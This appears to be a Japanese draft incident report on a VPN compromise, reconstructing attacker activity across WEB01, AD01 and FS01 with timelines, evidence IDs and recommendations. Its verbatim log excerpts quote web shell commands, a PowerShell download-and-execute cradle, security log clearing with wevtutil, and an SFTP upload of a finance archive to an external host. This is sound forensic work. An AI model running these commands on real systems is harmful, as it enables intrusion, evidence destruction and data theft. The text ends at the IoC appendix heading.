【ドラフト — 最終版ではありません】

# インシデント調査報告書

## 報告書メタデータ

| 項目 | 内容 |
|---|---|
| 報告書の位置づけ | インシデント調査報告書 |
| 報告区分 | 調査完了報告 |
| 作成日 | 2026-07-09 (JST) |
| 報告時点 | 2026-07-09 (JST) |
| 調査対象期間 | 2026-05-01 09:00 (JST) 〜 2026-05-04 08:59 (JST) |
| 版数 | 0.1(ドラフト) |
| 対象組織 / ケース | VPN Compromise and File Server Staging Investigation (case-2026-vpn-compromise) |
| 作成者 | IR Reporting Support Agent(レビュー前ドラフト) |
| 取扱区分 | 機密 |

## 目次

- 0. 本資料の取扱い
- 1. 調査概要
- 2. エグゼクティブサマリー・調査結果概要
- 3. 調査結果
- 4. 対象別調査結果詳細
- 5. 対応状況・推奨対策
- 付録A. IoC一覧
- 付録B. MITRE ATT&CK対応表
- 付録C. 関連ファイル・別紙一覧
- 付録D. 証拠保全記録

## 変更履歴

| 版数 | 日付 | 変更内容 | 作成者 |
|---|---|---|---|
| 0.1 | 2026-07-09 | 初版ドラフト作成 | IR Reporting Support Agent |

## 0. 本資料の取扱い

本資料は、インシデント調査の結果を関係者間で共有することを目的として作成した機密資料です。

本資料には、調査対象システム、ログ、アカウント、通信先、調査上の判断に関する情報が含まれるため、貴社内の関係者および事前に許可された関係者のみで取り扱ってください。

本資料の全部または一部を、事前の許可なく第三者へ開示、転送、複製、公開することを禁止します。

本資料の記載内容は、作成時点で提供された資料および確認できた証拠に基づいています。追加資料の取得または追加調査により変更される可能性があります。

### 本報告書に関する留意事項

本報告書に記載した攻撃関連のIPアドレス、ドメイン名、URLに直接アクセスしないでください。アクセスした場合、マルウェア感染、攻撃者への調査活動の露見、または追加被害につながる可能性があります。

攻撃関連のIPアドレスやドメイン名は、誤クリックや自動リンク化を避けるため、本文・表ではdefang形式(例: 203[.]0[.]113[.]10)で記載しています。ログ抜粋(コードブロック内)は証拠の逐語性を保つため原文のまま記載しています。

### 本報告書に関する問い合わせ先

<!-- レビュー担当者記入欄: 本報告書に関する問い合わせ先として、担当部署、担当者、メールアドレス、電話番号を記載してください。 -->

## 1. 調査概要

### 1.1 調査にかかる経緯

<!-- レビュー担当者記入欄: 調査依頼の経緯、検知の端緒、依頼元を記載してください。 -->

### 1.2 調査目的・調査範囲

<!-- レビュー担当者記入欄: 調査目的と調査範囲を記載してください。 -->

### 1.3 調査日程・調査期間

<!-- レビュー担当者記入欄: 調査実施日程と調査対象期間を記載してください。 -->

### 1.4 調査対象・提供データ

本調査では、以下のシステムから取得されたログおよびフォレンジックエクスポートを解析対象としました。

| 対象 | 提供データ | 主な期間 (JST) |
|---|---|---|
| VPN 装置 (vpn01) / RADIUS (radius01) | SSL-VPN 認証・セッションログ、RADIUS ログ、設定エクスポート、運用チャット記録 | 2026-05-02 06:58 〜 09:12 (JST) ほか |
| WEB01 | Web アクセスログ、auth.log、syslog、Web ルートファイル一覧、分析メモ | 2026-05-02 07:05 〜 07:10 (JST) ほか |
| AD01 | Security イベントログ、PowerShell Operational ログ、Sysmon ログ、分析メモ、調査メモ | 2026-05-02 07:11 〜 07:26 (JST) |
| FS01 | EDR プロセス・通信ログ、ファイルアクセスサマリー、MFT、USN ジャーナル、トリアージメモ | 2026-05-02 07:44 〜 08:13 (JST) |
| Firewall (fw01) | 通信ログ、NAT セッションログ、ブロックイベントログ、管理者メモ | 2026-05-02 07:07 〜 10:03 (JST) |
| WIN10-023 | Security イベントログ、ブラウザ履歴、ヘルプデスクチケット抜粋、分析メモ | 2026-05-02 09:18 〜 09:25 (JST) |

制約として、WEB01 のアプリケーションログ(証拠ID: EV-012)、AD01 の完全な EDR メモリテレメトリ(証拠ID: EV-023)、および外部ホスト 203[.]0[.]113[.]88 側の記録(証拠ID: EV-032, EV-044)は提供されておらず、解析対象に含まれていません。また、VPN の Windows イベントログ等、一部のデータソースは未解析の状態です（不足事項ID: GAP-db877b3e）。

### 1.5 調査方法・調査ツール

<!-- レビュー担当者記入欄: 使用した調査手法・ツールを記載してください。 -->

## 2. エグゼクティブサマリー・調査結果概要

本調査の結果は、次の 6 点に要約されます。

1. 2026-05-02 06:58 (JST) にサービスアカウント svc-vpn-backup の VPN 認証失敗が発生し、約 3 分半後の 07:01 (JST) に同一送信元 198[.]51[.]100[.]77 から MFA push 承認を伴う認証成功が記録されました（証拠ID: EV-001, EV-004）。当該アカウントは旧バックアップベンダー用であり、この時間帯の承認済み作業は見つかっておらず、過去 14 日間に同じ利用元の組み合わせも記録されていませんでした（証拠ID: EV-005, EV-006）。資格情報が本来の用途外で使用された可能性があります。
2. 同一 VPN セッション(割当 IP 10.8.14.23)から、WEB01、AD01、FS01 へ順次アクセスが行われました。VPN 装置のルートアクセス記録と Firewall の通信記録は時刻・宛先が一致しています（証拠ID: EV-002, EV-035）。
3. WEB01 では 07:08 (JST) のアップロード直後に /uploads/shell.php に対する OS コマンド付きリクエストが成功しており、Web シェルの設置と利用の可能性が高いと考えられます（証拠ID: EV-007, EV-010, EV-011）。設置経路はアプリケーションログ未取得のため特定できませんでした（証拠ID: EV-012）。
4. AD01 では、ドメイン探索コマンドの実行(07:16 (JST))、外部スクリプトのメモリ上実行(07:17 (JST))、管理者アカウント adm-backup の作成と管理者グループへの追加(07:18〜07:19 (JST))、および同アカウントによる Security ログ消去(07:25 (JST))が連続して記録されました（証拠ID: EV-015, EV-016, EV-017, EV-018, EV-020, EV-021）。
5. FS01 では Finance 共有のファイル読み取りに続き、robocopy によるステージング、7z によるアーカイブ作成、203[.]0[.]113[.]88 への SFTP 送信が記録されました。アーカイブサイズ 184,734,221 バイトは Firewall の送信バイト数と一致しています（証拠ID: EV-025, EV-026, EV-027, EV-029, EV-030, EV-034）。ただし外部ホスト側でのデータ受領は提供資料からは確認できませんでした（証拠ID: EV-032, EV-044）。
6. 優先対応として、svc-vpn-backup および adm-backup の無効化状況の確認、未解析データソースの解析、203[.]0[.]113[.]88 に関する追加調査を推奨します。詳細は 2.5 節および 5 章に記載します。

### 2.1 ヒアリング内容

<!-- レビュー担当者記入欄: 関係者ヒアリングの内容を記載してください。 -->

### 2.2 調査方針・対応方針

<!-- レビュー担当者記入欄: 調査方針・対応方針を記載してください。 -->

### 2.3 インシデント概要図

一連の活動の流れを以下に示します(時刻は JST)。

```text
[外部 198.51.100.77]
      | 05-02 06:58 認証失敗 → 07:01 MFA付き認証成功 (svc-vpn-backup)  EV-001/EV-004
      v
[VPN vpn01] -- セッション vpn-9f31 / 割当IP 10.8.14.23  EV-002
      |
      +--> 07:07 [WEB01 10.20.30.15]  upload.php POST → shell.php 実行  EV-007/EV-010/EV-011
      |         (07:09 DMZ内他ホストへの通信はブロック  EV-038)
      +--> 07:11 [AD01 10.10.0.10]   4624 → 探索(net/nltest/Get-ADComputer)
      |         → update.ps1 実行 → adm-backup 作成・管理者化
      |         → Securityログ消去    EV-013〜EV-021
      +--> 07:43 [FS01 10.10.0.20]   Finance共有読取 → robocopy → 7z
                → 08:12 SFTP で 203.0.113.88:22 へ送信  EV-025〜EV-034
                     (外部側の受領は未確認  EV-032/EV-044)

[別系統(業務の可能性)] j.sato: 09:12 VPN接続 → WIN10-023 → FS01へRDP
                     ヘルプデスクチケット HD-8821 で説明できる可能性  EV-003/EV-040〜EV-042
```

### 2.4 インシデントタイムライン

主要な事象を時系列で示します(時刻は JST、元ログは UTC)。

| 時刻 (JST) | ホスト | 事象 | 確度 | 証拠ID |
|---|---|---|---|---|
| 2026-05-02 06:58 (JST) | vpn01 | svc-vpn-backup の認証失敗(パスワード誤り) | 確認 | EV-001 |
| 2026-05-02 07:01 (JST) | vpn01 / radius01 | 同一送信元 198[.]51[.]100[.]77 から MFA push 承認を伴う認証成功、IP 10.8.14.23 割当 | 確認 | EV-001, EV-004 |
| 2026-05-02 07:05〜07:06 (JST) | WEB01 | admin への SSH 失敗 2 回の後、deploy の公開鍵認証成功 | 確認 | EV-008 |
| 2026-05-02 07:08 (JST) | WEB01 | POST /admin/upload.php(200)、直後に shell.php が作成(サイズ 148 バイト) | 確認 | EV-007, EV-011 |
| 2026-05-02 07:09〜07:10 (JST) | WEB01 | shell.php への cmd パラメータ付きリクエスト(whoami, id, cat /etc/passwd) | 確認 | EV-007, EV-010 |
| 2026-05-02 07:09 (JST) | fw01 | 10.8.14.23 から DMZ 内他ホスト(8080/8443)への通信をブロック | 確認 | EV-038 |
| 2026-05-02 07:11 (JST) | AD01 | svc-vpn-backup のネットワークログオン(4624, NTLM, 送信元 10.8.14.23) | 確認 | EV-013 |
| 2026-05-02 07:14 (JST) | AD01 | cifs/fs01 への Kerberos サービスチケット要求(4769, RC4) | 確認 | EV-014 |
| 2026-05-02 07:16 (JST) | AD01 | net group "Domain Admins" /domain、nltest /dclist の実行 | 確認 | EV-015 |
| 2026-05-02 07:17 (JST) | AD01 | hxxp://10.20.30.15/update.ps1 のダウンロード実行(PowerShell 4104、Sysmon で通信記録) | 確認 | EV-018, EV-020 |
| 2026-05-02 07:18〜07:19 (JST) | AD01 | adm-backup の作成(4720)と Administrators への追加(4732) | 確認 | EV-016 |
| 2026-05-02 07:20 (JST) | AD01 | Get-ADComputer による全コンピュータ列挙 | 確認 | EV-019 |
| 2026-05-02 07:25〜07:26 (JST) | AD01 | adm-backup による Security ログ消去(1102、wevtutil cl Security) | 確認 | EV-017, EV-021 |
| 2026-05-02 07:44〜07:45 (JST) | FS01 | Finance 共有への接続、Q1_payroll.xlsx・board_minutes.docx の読み取り、robocopy によるステージング | 確認 | EV-029, EV-025 |
| 2026-05-02 07:52 (JST) | FS01 | 7z.exe による finance_20260501.7z の作成(184,734,221 バイト) | 確認 | EV-026, EV-030 |
| 2026-05-02 08:12〜08:14 (JST) | FS01 / fw01 | sftp.exe による 203[.]0[.]113[.]88:22 への送信。送信バイト数はアーカイブサイズと一致 | 確認 | EV-027, EV-034, EV-037 |
| 2026-05-02 08:13 (JST) | FS01 | ステージングコピー(Q1_payroll.xlsx 等)の削除 | 確認 | EV-031 |
| 2026-05-02 09:12 (JST) | vpn01 | j.sato の VPN 認証成功(別セッション、割当 10.8.14.8) | 確認 | EV-003 |
| 2026-05-02 09:18〜09:20 (JST) | WIN10-023 | j.sato のリモートログオンと FS01 への RDP クライアント起動 | 確認 | EV-040 |
| 2026-05-02 09:25 (JST) | WIN10-023 | ヘルプデスクチケット HD-8821 の参照 | 確認 | EV-041 |
| 2026-05-02 09:30 (JST) | FS01 | backup-agent による日次バックアップ実行(定常動作の可能性) | 確認 | EV-028 |
| 2026-05-02 10:03 (JST) | fw01 | 10.8.14.23 から 10.10.0.30:3389 への RDP 試行を拒否 | 確認 | EV-036 |
| 2026-05-02 12:21 (JST) | WEB01 | 別送信元 198[.]51[.]100[.]50 から deploy の SSH 公開鍵認証成功 | 確認 | EV-009 |

### 2.5 推奨対応事項

1. svc-vpn-backup および adm-backup の無効化・資格情報リセットの実施状況を確認し、未実施であれば直ちに実施してください（証拠ID: EV-001, EV-016）。
2. 203[.]0[.]113[.]88 への通信の遮断と、当該宛先に関する追加調査(通信履歴の全量確認)を推奨します（証拠ID: EV-034, EV-037）。
3. WEB01 の shell.php の隔離・保全と、アップロード機能(upload.php)の脆弱性確認を推奨します（証拠ID: EV-007, EV-011）。設置経路が未特定のため、アプリケーションログの取得が必要です（証拠ID: EV-012）。
4. deploy アカウントの SSH 鍵の配備先と利用主体の確認を推奨します。調査期間内に複数の外部送信元からの鍵認証成功が記録されています（証拠ID: EV-008, EV-009）。
5. 未解析のデータソース(VPN の Windows イベントログ等)の解析を完了し、所見の裏付けを強化してください（不足事項ID: GAP-db877b3e）。
6. Firewall ルール egress_sftp_approved の見直しを推奨します。ルール名から業務承認済みと判断できない旨の運用側見解が記録されています（証拠ID: EV-039）。

## 3. 調査結果

### 3.1 初期侵入

2026-05-02 06:58 (JST) に vpn01 で svc-vpn-backup のパスワード誤りによる認証失敗が記録され、約 3 分半後の 07:01 (JST) に同一送信元 198[.]51[.]100[.]77 から MFA push 承認を伴う認証成功が記録されました。この認証イベントは RADIUS 側のログでも同時刻に記録されており、認証経路の二重のログにより発生自体の確度は高いと考えられます（証拠ID: EV-001, EV-004）。セッション vpn-9f31 には内部 IP 10.8.14.23 が割り当てられ、以後の内部活動の起点となりました（証拠ID: EV-002）。

svc-vpn-backup は旧バックアップベンダー接続用のサービスアカウントであり、VPN 設定エクスポートの記載では、この時間帯の承認済みメンテナンス枠は見つかっていません（証拠ID: EV-005）。また、VPN 運用チームの確認では、過去 14 日間のログに 198[.]51[.]100[.]77 と svc-vpn-backup の同じ組み合わせは存在しませんでした。ただしログ保存期間が短く、それ以前の利用有無は提供資料からは確認できませんでした（証拠ID: EV-006）。失敗直後の成功と MFA push 承認の組み合わせは、資格情報が本来の用途外で使用された可能性を示唆しますが、MFA 承認を行った端末の特定には至っておらず、侵入手法(資格情報の入手経路)は本資料からは特定できません。この点は制約として明記します（証拠ID: EV-001）。

### 3.2 認証情報取得・アカウント悪用

一連の活動は、正規のサービスアカウント svc-vpn-backup と、新規作成された adm-backup の 2 つのアカウントを軸に行われました。svc-vpn-backup は VPN 認証、AD01 へのネットワークログオン(NTLM)、FS01 の CIFS サービスへの Kerberos チケット要求、および FS01 上の一連のプロセス実行の主体として記録されています（証拠ID: EV-013, EV-014, EV-025）。なお、4769 の TicketEncryptionType 0x17(RC4)が当該ドメインで想定内の設定かは提供資料からは確認できませんでした（証拠ID: EV-014）。

2026-05-02 07:18 (JST) に AD01 で adm-backup が作成され、07:19 (JST) に Administrators グループへ追加されました（証拠ID: EV-016）。作成が承認済みメンテナンス作業によるものか、変更チケットが存在するかは、調査メモ上も未確認事項として残っています（証拠ID: EV-024）。作成の約 6 分後に同アカウントで Security ログの消去が行われたこと(3.7 節)を踏まえると、永続化目的で作成された可能性がありますが、正当な作成である可能性を排除するには変更管理記録の確認が必要です。

また、WEB01 では 07:05〜07:06 (JST) に admin ユーザーへの SSH パスワード失敗 2 回の後、deploy アカウントの公開鍵認証が成功し、Web ルート配下のファイル列挙が行われました（証拠ID: EV-008）。さらに 12:21 (JST) には別の外部送信元 198[.]51[.]100[.]50 からも deploy の鍵認証成功が記録されています（証拠ID: EV-009）。deploy の秘密鍵がどの端末に配備されていたかは提供資料からは確認できず、鍵の使用主体は特定できません。2 つの送信元が同一主体かどうかも判断できないため、鍵の管理状況の確認を推奨します。

### 3.3 内部探索・横展開

VPN セッション vpn-9f31 からは、07:07 (JST) に WEB01(10.20.30.15:443)、07:11 (JST) に AD01(10.10.0.10:445)、07:43 (JST) に FS01(10.10.0.20:445)へのルートアクセスが順次許可されました。この系列は Firewall の通信ログでも同時刻・同宛先で記録されており、VPN 装置側とネットワーク側の 2 系統の記録が一致しています（証拠ID: EV-002, EV-035）。単一のセッションから Web サーバー、ドメインコントローラ、ファイルサーバーへ段階的に対象を広げた点は、環境の把握から目的データへの到達という一連の流れとして読み取れます。

AD01 上では、07:16 (JST) に net group "Domain Admins" /domain と nltest /dclist によるドメイン管理者・ドメインコントローラの列挙、07:20 (JST) に Get-ADComputer による全コンピュータと OS 情報の列挙が記録されました（証拠ID: EV-015, EV-019）。これらはドメイン探索活動の典型であり、バックアップ用サービスアカウントの通常動作としては説明が困難です。ただし業務上の実行であった可能性は否定できていません。

WEB01 での Web シェル利用と同じ 07:09 (JST) 帯には、10.8.14.23 から DMZ 内の他ホスト(10.20.30.16:8080、10.20.30.17:8443)への通信が Firewall によりブロックされました（証拠ID: EV-038）。シグネチャ名は装置側の判定であり意図の断定はできませんが、DMZ 内の探査が試みられた可能性があります。また 10:03 (JST) には 10.8.14.23 から 10.10.0.30:3389 への RDP 試行が拒否されました。この時点でセッション vpn-9f31 は既に切断されており、当該時刻の 10.8.14.23 の割当先は提供資料からは特定できません（証拠ID: EV-036）。

なお、j.sato による WIN10-023 から FS01 への RDP(09:18〜09:20 (JST))は、直後のヘルプデスクチケット HD-8821 の参照と、チケット側の記載から、業務対応として説明できる可能性があります。ただしこのチケットは svc-vpn-backup の挙動を説明するものではなく、FS01 への全アクセスの正当化には使用できません（証拠ID: EV-003, EV-040, EV-041, EV-042）。WIN10-023 と svc-vpn-backup のセッションを直接結びつける証拠は、提供された範囲では観測されませんでした（証拠ID: EV-043）。

### 3.4 永続化

2026-05-02 07:18 (JST) の adm-backup 作成(4720)と 07:19 (JST) の Administrators グループへの追加(4732)は、探索コマンド実行の約 2 分後に発生しており、管理者権限を持つアカウントの確保、すなわち永続化を目的とした操作であった可能性があります（証拠ID: EV-016）。作成主体の Subject は svc-vpn-backup であり、初期侵入からの一連の流れの中に位置づけられます。

一方で、承認済みメンテナンススクリプトによる作成や、GPO・IAM の変更チケットに基づく作成である可能性は、調査メモ上も未確認のまま残っています（証拠ID: EV-024）。永続化と断定する前に、変更管理記録との突合が必要です。このほかのレジストリ・スケジュールタスク等による永続化の有無は、提供されたデータソースの範囲では確認できませんでした。

### 3.5 C2通信・プロキシ・外部通信

AD01 では 07:17 (JST) に、PowerShell による hxxp://10.20.30.15/update.ps1 のダウンロードとメモリ上での実行(IEX)が記録されました。-nop -w hidden の指定を伴っており、Sysmon 側でも同時刻に powershell.exe から 10.20.30.15:80 への接続が記録されています（証拠ID: EV-018, EV-020）。取得元の 10.20.30.15 は WEB01 の DMZ アドレスであり、直前に Web シェルが設置されたホストから内部へスクリプトが配布された可能性があります。ただし update.ps1 の内容そのもの、および AD01 のメモリ内活動は、EDR メモリテレメトリが未取得のため提供資料からは確認できませんでした（証拠ID: EV-023）。

外部通信としては、FS01 から 203[.]0[.]113[.]88:22 への SFTP 通信(3.6 節)のほかに、常時的な C2 通信を示す記録は提供されたログの範囲では確認できませんでした。ネットワークフロー、DNS、プロキシ等のログは未提供であり、この判断には制約があります（証拠ID: EV-044）。

### 3.6 情報窃取・情報持ち出し

FS01 では、07:44 (JST) に svc-vpn-backup による Finance 共有への接続、07:45 (JST) に Q1_payroll.xlsx および board_minutes.docx の読み取りが記録され、その直後に robocopy による D:\Shares\Finance から C:\ProgramData\stage\Finance への再帰コピーが実行されました（証拠ID: EV-029, EV-025）。07:52 (JST) には 7z によるアーカイブ finance_20260501.7z の作成が記録され、MFT 上のサイズは 184,734,221 バイトでした（証拠ID: EV-026, EV-030）。

08:12 (JST) に sftp.exe が -b オプション(バッチファイル C:\ProgramData\stage\batch.txt 指定)で backup@203[.]0[.]113[.]88 に対して実行され、Firewall では同時刻に FS01 から 203[.]0[.]113[.]88:22 への外向き通信が許可されました。1 本目のフローの送信バイト数 184,734,221 はアーカイブのサイズと一致しており、当該アーカイブが外部ホストへ送信されたことを示しています（証拠ID: EV-027, EV-034）。NAT セッションログの累計送信量 263,002,492 バイトも、Firewall の 2 フローの合計とおおむね一致します（証拠ID: EV-037）。トリアージメモに転記されたターミナル履歴では、batch.txt の内容として finance_20260501.7z の put コマンドが表示されたと記録されていますが、この転記は画面共有からの書き起こしであり、保全済みイメージによる裏付けはありません（証拠ID: EV-033）。

一方、以下の 2 点は未確認事項として明確に区別する必要があります。第一に、2 本目のフロー(約 78 MB)に対応するローカルのアーカイブは提供資料からは特定できませんでした（証拠ID: EV-034）。第二に、外部ホスト 203[.]0[.]113[.]88 側でのデータ受領は、いかなるログでも確認されておらず、提供資料からは確認できませんでした（証拠ID: EV-032, EV-044）。したがって本報告書では、外部への送信の観測までを事実として記載し、データの窃取(受領)の成立は断定しません。なお、Firewall ルール名 egress_sftp_approved の「approved」という語をもって当該転送を業務承認済みと解釈できない旨の運用側見解が記録されています（証拠ID: EV-039）。09:30 (JST) の backup-agent による日次バックアップは、サービス配下から起動された定常動作の可能性が高く、上記の一連の活動とは別系統として扱いました（証拠ID: EV-028）。

### 3.7 防衛回避・痕跡消去

2026-05-02 07:25 (JST) に AD01 で Security ログの消去(イベント 1102、Subject は adm-backup)が記録され、07:26 (JST) には Sysmon 側で adm-backup による wevtutil cl Security の実行が記録されました。イベントログとプロセス実行記録の 2 系統で同じ操作が裏付けられています（証拠ID: EV-017, EV-021）。作成直後のアカウントによるログ消去であり、痕跡消去活動であった可能性が高いと考えられます。

FS01 では、SFTP 送信の約 1 分後の 08:13 (JST) に、ステージングディレクトリ配下の Q1_payroll.xlsx および board_minutes.docx の削除が USN ジャーナルに記録されました。転送後の痕跡整理の可能性がありますが、削除を実行したプロセス・ユーザーは提供資料からは特定できませんでした（証拠ID: EV-031）。

## 4. 対象別調査結果詳細

本章では、対象システムごとに確認事実と根拠となるログ抜粋を示します。抜粋は取得元の原文(UTC 表記)をそのまま掲載しています。

### 4.1 VPN (vpn01 / radius01)

svc-vpn-backup の認証失敗から約 3 分半後の認証成功、およびセッション vpn-9f31 からの内部 3 ホストへのルートアクセスが記録されました。RADIUS 側にも同一の認証系列が記録されています（証拠ID: EV-001, EV-002, EV-004）。

VPN/sslvpn.log.txt(1〜2 行目):

```text
2026-05-01T21:58:12Z vpn01 sslvpn: auth failed user=svc-vpn-backup src_ip=198.51.100.77 reason="bad password" mfa=not_started
2026-05-01T22:01:44Z vpn01 sslvpn: auth success user=svc-vpn-backup src_ip=198.51.100.77 mfa=push_approved session=vpn-9f31 assigned_ip=10.8.14.23
```

VPN/vpn_radius.log.txt(1〜3 行目):

```text
2026-05-01T21:58:12Z radius01 radius: Access-Reject user=svc-vpn-backup nas=vpn01 calling_station=198.51.100.77 reply="invalid password"
2026-05-01T22:01:44Z radius01 radius: Access-Accept user=svc-vpn-backup nas=vpn01 calling_station=198.51.100.77
```

制約: 当該アカウントの承認済み作業の有無は設定エクスポート時点の調査結果であり、承認が存在しないことの確定ではありません（証拠ID: EV-005）。ログ保存期間(14 日)以前の利用履歴は確認できません（証拠ID: EV-006）。j.sato による別セッション(vpn-a102、09:12 (JST))は業務対応の可能性があり、別系統として扱いました（証拠ID: EV-003）。

### 4.2 WEB01

アップロードエンドポイントへの POST の 1 秒後に shell.php が作成され、直後に OS コマンド相当のパラメータ付きリクエストが 200 応答を得ています。サーバー側の syslog にもコマンド実行の記録があり、Web シェルの設置と利用の可能性が高いと考えられます（証拠ID: EV-007, EV-010, EV-011）。

WEB01/access.log.txt(3〜6 行目):

```text
2026-05-01T22:08:41Z 10.8.14.23 - - "POST /admin/upload.php HTTP/1.1" 200 91 "https://web01/admin/panel.php" "Mozilla/5.0"
2026-05-01T22:09:11Z 10.8.14.23 - - "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 37 "-" "curl/8.1"
```

WEB01/webroot_file_listing.csv.txt(4 行目):

```text
/var/www/html/uploads/shell.php,www-data,www-data,0644,148,2026-05-01T22:08:42Z,99b2d8b894775f3d7a2f99ff4f5e5c6a
```

制約: アプリケーションログが未取得のため、shell.php のアップロード経路(upload.php の脆弱性か、認証済みセッションの悪用か)は特定できませんでした（証拠ID: EV-012）。SSH の deploy アカウントの鍵認証成功が複数の外部送信元から記録されており、鍵の使用主体は特定できていません（証拠ID: EV-008, EV-009）。

### 4.3 AD01

VPN 割当 IP からのネットワークログオンに続き、ドメイン探索、外部スクリプトのメモリ上実行、管理者アカウントの作成、ログ消去が約 15 分の間に連続して記録されました（証拠ID: EV-013, EV-014, EV-015, EV-016, EV-017, EV-018, EV-019, EV-020, EV-021）。

AD01/security_events.evtx.txt(6〜8 行目):

```text
2026-05-01T22:18:44Z AD01 Security 4720: A user account was created. SubjectUserName=adm-backup AccountName=adm-backup
2026-05-01T22:19:12Z AD01 Security 4732: A member was added to a security-enabled local group.
2026-05-01T22:25:47Z AD01 Security 1102: The audit log was cleared. SubjectUserName=adm-backup
```

AD01/powershell_operational.evtx.txt(1〜2 行目):

```text
2026-05-01T22:17:02Z AD01 PowerShell 4104: Creating Scriptblock text: IEX(New-Object Net.WebClient).DownloadString('http://10.20.30.15/update.ps1')
```

AD01/sysmon_process_network.csv.txt(5 行目):

```text
2026-05-01T22:26:01Z,1,AD01,CORP\adm-backup,C:\Windows\System32\wevtutil.exe,wevtutil cl Security,C:\Windows\System32\cmd.exe,,,
```

制約: EDR メモリテレメトリが未取得のため、update.ps1 の実行内容は確認できませんでした（証拠ID: EV-023）。adm-backup 作成の変更管理上の正当性は未確認です（証拠ID: EV-024）。分析メモ内の命令文形式の英文はテスト用データとして記録しました（証拠ID: EV-022）。

### 4.4 FS01

Finance 共有の読み取り、ステージング、アーカイブ作成、外部への SFTP 送信、ステージングコピーの削除が約 90 分の間に記録されました（証拠ID: EV-025, EV-026, EV-027, EV-029, EV-030, EV-031, EV-033）。

FS01/edr_process_network.csv.txt(3〜5 行目):

```text
2026-05-01T22:45:33Z,ProcessCreate,FS01,CORP\svc-vpn-backup,robocopy.exe,robocopy.exe D:\Shares\Finance C:\ProgramData\stage\Finance /E /R:1 /W:1,C:\Windows\System32\cmd.exe,,,0,0
2026-05-01T22:52:11Z,ProcessCreate,FS01,CORP\svc-vpn-backup,7z.exe,7z.exe a C:\ProgramData\stage\finance_20260501.7z C:\ProgramData\stage\Finance,C:\Windows\System32\cmd.exe,,,0,0
2026-05-01T23:12:10Z,ProcessCreate,FS01,CORP\svc-vpn-backup,sftp.exe,sftp.exe -b C:\ProgramData\stage\batch.txt backup@203.0.113.88,C:\Windows\System32\cmd.exe,,,0,0
```

FS01/mft.csv.txt(5〜6 行目):

```text
88201,finance_20260501.7z,C:\ProgramData\stage\finance_20260501.7z,2026-05-01T22:52:12Z,2026-05-01T22:58:49Z,2026-05-01T23:12:09Z,184734221
88202,batch.txt,C:\ProgramData\stage\batch.txt,2026-05-01T23:10:02Z,2026-05-01T23:10:02Z,2026-05-01T23:12:09Z,74
```

FS01/usn_journal.csv.txt(6〜7 行目):

```text
2026-05-01T23:13:12Z,FILE_DELETE,C:\ProgramData\stage\Finance,Q1_payroll.xlsx
2026-05-01T23:13:14Z,FILE_DELETE,C:\ProgramData\stage\Finance,board_minutes.docx
```

制約: 外部ホスト側の記録は未取得であり、受領の成立は確認できません（証拠ID: EV-032）。backup-agent による日次バックアップは別系統の定常動作の可能性が高いと判断しました（証拠ID: EV-028）。

### 4.5 Firewall (fw01)

VPN 割当 IP から WEB01、AD01、FS01 への通信許可、DMZ 内探査のブロック、FS01 から 203[.]0[.]113[.]88:22 への外向き通信(2 フロー)が記録されました。送信バイト数はアーカイブサイズおよび NAT 累計と一致しています（証拠ID: EV-034, EV-035, EV-036, EV-037, EV-038, EV-039）。

Firewall/fw_traffic.csv.txt(5〜6 行目):

```text
2026-05-01T23:12:11Z,fw01,10.10.0.20,internal,203.0.113.88,internet,22,tcp,allow,184734221,9134,egress_sftp_approved
2026-05-01T23:14:40Z,fw01,10.10.0.20,internal,203.0.113.88,internet,22,tcp,allow,78233111,4921,egress_sftp_approved
```

Firewall/nat_session.log.txt(2〜3 行目):

```text
2026-05-01T23:12:11Z fw01 NAT create original_src=10.10.0.20 translated_src=198.51.100.10 dst=203.0.113.88 dst_port=22 session=fw-s-10188
2026-05-01T23:14:40Z fw01 NAT update original_src=10.10.0.20 translated_src=198.51.100.10 dst=203.0.113.88 dst_port=22 session=fw-s-10188 bytes_out=263002492 bytes_in=15123
```

制約: 2 本目のフロー(78,233,111 バイト)に対応するローカルアーカイブは特定できていません（証拠ID: EV-034）。

### 4.6 WIN10-023

j.sato のリモートログオン、FS01 への RDP クライアント起動、直後のヘルプデスクチケット参照が記録されました。チケット HD-8821 の記載から業務対応として説明できる可能性がありますが、svc-vpn-backup の活動の説明には適用できません（証拠ID: EV-040, EV-041, EV-042）。

WIN10-023/security_events.evtx.txt(3〜4 行目):

```text
2026-05-02T00:18:50Z WIN10-023 Security 4624: An account was successfully logged on. LogonType=10 AccountName=j.sato SourceNetworkAddress=10.8.14.8 WorkstationName=WIN10-023
2026-05-02T00:20:00Z WIN10-023 Security 4688: A new process has been created. SubjectUserName=j.sato NewProcessName=C:\Windows\System32\mstsc.exe CommandLine="mstsc.exe /v:FS01"
```

制約: WIN10-023 と svc-vpn-backup の VPN セッションを直接結びつける証拠は、提供された範囲では観測されませんでした。これは関連が存在しなかったことの証明ではありません（証拠ID: EV-043）。

## 5. 対応状況・推奨対策

本章では、確認された調査結果および制約事項を踏まえた対応状況と推奨対策を記載します。対応の実施状況は本資料からは確認できないため、レビュー時に実施状況を追記してください。

### 5.1 封じ込め・復旧

1. svc-vpn-backup の無効化または資格情報リセット、VPN 接続許可の見直し（証拠ID: EV-001, EV-005）。
2. adm-backup の無効化と、作成に関する変更管理記録の確認（証拠ID: EV-016, EV-024）。
3. WEB01 の shell.php の隔離・保全、upload.php の受け口の停止または修正（証拠ID: EV-007, EV-011）。
4. 203[.]0[.]113[.]88 への外向き通信の遮断、および Firewall ルール egress_sftp_approved の範囲見直し（証拠ID: EV-034, EV-039）。
5. deploy アカウントの SSH 鍵のローテーションと配備先の棚卸し（証拠ID: EV-008, EV-009）。

### 5.2 再発防止策

1. サービスアカウントの VPN 利用の原則禁止または送信元制限・時間帯制限の導入。MFA push 承認の通知先端末の管理強化（証拠ID: EV-001, EV-006）。
2. ドメインコントローラ上での特権グループ変更・監査ログ消去の即時検知(イベント 4720/4732/1102 の監視)の導入（証拠ID: EV-016, EV-017）。
3. ファイルサーバーからの大容量外向き転送の検知しきい値の設定と、SFTP 等の外向きプロトコルの許可先の限定（証拠ID: EV-034, EV-037）。
4. 未取得だったログ(Web アプリケーションログ、EDR メモリテレメトリ、ネットワークフロー、DNS、プロキシ)の取得体制の整備。今回の調査ではこれらの不足が複数の所見の確度を制約しました（証拠ID: EV-012, EV-023, EV-044）。
5. 未解析データソースの解析完了と、単一証拠に依存する所見への裏付け追加（不足事項ID: GAP-db877b3e, GAP-dcabb90b, GAP-aacb5150）。

## 付録A. IoC一覧

入力証拠から抽出できた範囲のみを記載します。悪性と確定したものではなく、調査上の注目対象を含みます。

